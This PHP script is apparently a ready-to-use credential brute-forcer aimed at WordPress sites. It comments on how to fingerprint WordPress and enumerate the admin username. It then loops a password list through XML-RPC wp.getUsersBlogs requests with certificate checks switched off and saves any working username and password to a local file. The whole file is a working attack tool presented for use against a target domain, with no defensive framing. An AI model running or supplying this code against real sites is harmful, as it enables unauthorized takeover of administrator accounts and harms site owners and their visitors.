<?php
/**
 * Created by PhpStorm.
 * User: CosMOs
 * Date: 10/22/2022
 * Time: 9:36 AM
 */

ini_set('max_execution_time',0);




# https://targetdomain.com/wp-includes/wlwmanifest.xml   Is it WordPress website ?
# https://targetdomain.com/?author=1   find admin profile



$username = 'admin';  // set admin name here
// $password = '12345678';
$password_list = [
    '123245',
    '123456789',
    'abcdef'
];

if(1) // load password from file ?
{
    $password_file = 'passwords.txt';
    $pass_txts = file_get_contents( $password_file);
    $password_list = explode(PHP_EOL,$pass_txts);
}


// print_r($password_list);exit();


$url = 'http://targetdomain.com/xmlrpc.php';  // change target domain


foreach ($password_list as $password)
{
    if(Attack($url,$username,$password))
    {
        // password will store into logindata.txt file
        file_put_contents('logindata.txt',"Username:{$username} AND Password:{$password}");
        echo "Username:{$username} AND Password:{$password}";
        exit;
    }
}



function Attack($url,$username,$password)
{

    $requested = <<<sddfgdsfjdsgfydsgfuydis
<?xml version="1.0" encoding="UTF-8"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>{$username}</value></param> 
<param><value>{$password}</value></param> 
</params> 
</methodCall>
sddfgdsfjdsgfydsgfuydis;


    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_ENCODING ,"ISO-8859-1");
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: text/xml','User-Agent: myXMLRPCClient/1.0'));
    curl_setopt($ch, CURLOPT_POSTFIELDS, $requested);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//curl_setopt($ch, CURLOPT_HEADER, 1);

   $response = curl_exec($ch);
    curl_close($ch);

   if(strpos($response,'isAdmin')>0)
   {
       return 1;
   }else{
       return 0;
   }
}



